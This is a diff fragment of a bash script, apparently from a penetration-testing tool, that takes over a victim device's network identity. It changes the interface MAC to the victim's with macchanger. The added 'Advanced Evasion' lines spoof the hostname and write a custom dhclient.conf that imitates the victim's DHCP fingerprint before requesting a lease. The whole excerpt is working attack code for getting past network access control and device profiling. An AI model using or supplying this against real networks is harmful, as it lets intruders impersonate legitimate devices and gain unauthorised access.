@@ -73,13 +73,16 @@ echo "[*] Executing Full Identity Spoofing for $VICTIM_MAC..."
 ip link set "$INTERFACE" down
 macchanger -m "$VICTIM_MAC" "$INTERFACE"
 
+# Advanced Evasion: Spoof Hostname & DHCP Fingerprint
 OLD_HOSTNAME=$(hostname)
 SPOOFED_HOSTNAME="Workstation-$(echo $VICTIM_MAC | cut -d: -f5,6 | tr -d ':')"
+echo "[*] Temporarily spoofing hostname to $SPOOFED_HOSTNAME..."
 hostname "$SPOOFED_HOSTNAME"
 trap "hostname $OLD_HOSTNAME" EXIT
 
 ip link set "$INTERFACE" up
 
+# Create custom dhclient.conf to mimic high-fidelity fingerprints
 DHCP_CONF="${EVIDENCE_DIR}/g4_dhclient.conf"
 cat <<EOF > "$DHCP_CONF"
 send host-name "$SPOOFED_HOSTNAME";
@@ -89,7 +92,7 @@ request subnet-mask, broadcast-address, time-offset, routers,
         rfc3442-classless-static-routes, ntp-servers;
 EOF
 
-echo "[*] Requesting DHCP lease..."
+echo "[*] Requesting DHCP lease with custom Fingerprint (Option 55)..."
 timeout 15 dhclient -v -cf "$DHCP_CONF" "$INTERFACE" || true
 
 # 3. Verification
